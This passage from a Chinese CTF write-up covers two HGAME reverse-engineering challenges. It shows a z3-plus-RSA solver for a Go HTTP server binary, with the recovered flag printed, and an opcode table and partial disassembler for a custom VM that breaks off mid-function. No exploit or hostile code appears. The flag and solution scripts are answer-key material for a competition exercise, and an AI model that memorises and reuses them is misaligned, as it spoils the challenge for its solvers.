	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>
};

<span style="color:#75715e">#endif
</span></code></pre></div><h3 id="reserver">[RE]server</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>下断点，浏览器输入 <code>localhost:9090?flag=hgame{}</code> 就能断住，然后就是慢慢调试了</p>
<p>rsa 部分用的 <code>math/big</code> 库中的东西，还是比较容易识别的（go 还是看汇编舒服）</p>
<p>随后就是两个循环的异或了，这里用 z3 解的，所以逻辑直接看代码就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

flag <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#39;f</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i, <span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>)]
s <span style="color:#f92672">=</span> Solver()

c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x66</span>
flag2 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
    v16 <span style="color:#f92672">=</span> flag[i]
    flag2<span style="color:#f92672">.</span>append(v16 <span style="color:#f92672">^</span> c)
    c <span style="color:#f92672">=</span> v16

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
    v18 <span style="color:#f92672">=</span> flag2[i]
    flag2[i] <span style="color:#f92672">=</span> v18 <span style="color:#f92672">^</span> c
    c <span style="color:#f92672">=</span> v18

cipher <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, 
    <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, 
    <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, 
    <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span>,
    <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, 
    <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>,
    <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, 
    <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>
]

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
    s<span style="color:#f92672">.</span>add(flag2[i] <span style="color:#f92672">==</span> cipher[i])

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">153</span>):
    s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&gt;=</span> ord(<span style="color:#e6db74">&#39;0&#39;</span>))
    s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&lt;=</span> ord(<span style="color:#e6db74">&#39;9&#39;</span>))

s<span style="color:#f92672">.</span>check()
m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
    print (chr(m[i]<span style="color:#f92672">.</span>as_long()), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
<span style="color:#75715e"># 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024</span>

M <span style="color:#f92672">=</span> <span style="color:#ae81ff">92582184765240663364795767694262273105045150785272129481762171937885924776597</span>
N <span style="color:#f92672">=</span> <span style="color:#ae81ff">107310528658039985708896636559112400334262005367649176746429531274300859498993</span>

t <span style="color:#f92672">=</span> M <span style="color:#f92672">*</span> N
e <span style="color:#f92672">=</span> <span style="color:#ae81ff">950501</span>
phi <span style="color:#f92672">=</span> (M <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)

n2s(pow(<span style="color:#ae81ff">135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024</span>, invmod(e, phi), t))
<span style="color:#75715e"># b&#39;hgame{g0_and_g0_http_5erv3r_nb}&#39;</span>
</code></pre></div><h3 id="reezvm">[RE]ezvm</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>把几个指令整理一下</p>
<p>能够看出特定用途的几个寄存器：</p>
<p>[8]: ZF 相等为 0，大于为 1，小于为 -1
[9]: stack
[9 + 100]: code
[9 + 200]: data</p>
<p>其他的应该都是 rax 之类的</p>
<p>总结的几个指令：</p>
<table>
<thead>
<tr>
<th style="text-align:center">op</th>
<th style="text-align:left">disasm</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:left"><code>mov r3, r2</code></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:left"><code>inc r2</code></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:left"><code>dec r2</code></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:left"><code>xor r3, r7</code></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:left"><code>push r3</code></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:left"><code>push r5</code></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:left"><code>push r6</code></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:left"><code>pop r3</code></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:left"><code>pop r5</code></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:left"><code>pop r6</code></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:left"><code>pop r2</code></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:left"><code>pop r7</code></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:left"><code>jz $+1+r6</code></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:left"><code>jnz $+1+r6</code></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:left"><code>jmp $+1+r2</code></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:left"><code>cmp r3, r5</code></td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:left"><code>getchar(r3)</code></td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:left"><code>putchar(r3)</code></td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td style="text-align:left"><code>push *((r4++)+0xD1)</code></td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td style="text-align:left"><code>mov r3, [rbp+r2]</code></td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td style="text-align:left"><code>mov [rbp+r2], r3</code></td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td style="text-align:left"><code>add r3, r3</code></td>
</tr>
</tbody>
</table>
<p>接下来就是反汇编了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">code <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x0F</span>, 
    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0D</span>,
    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x15</span>, 
    <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>,
    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, 
    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x0F</span>,
    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>, 
    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x0E</span>
]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disasm</span>(i, c):
    <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [3], [2]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;inc [2]&#34;</span>)
    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
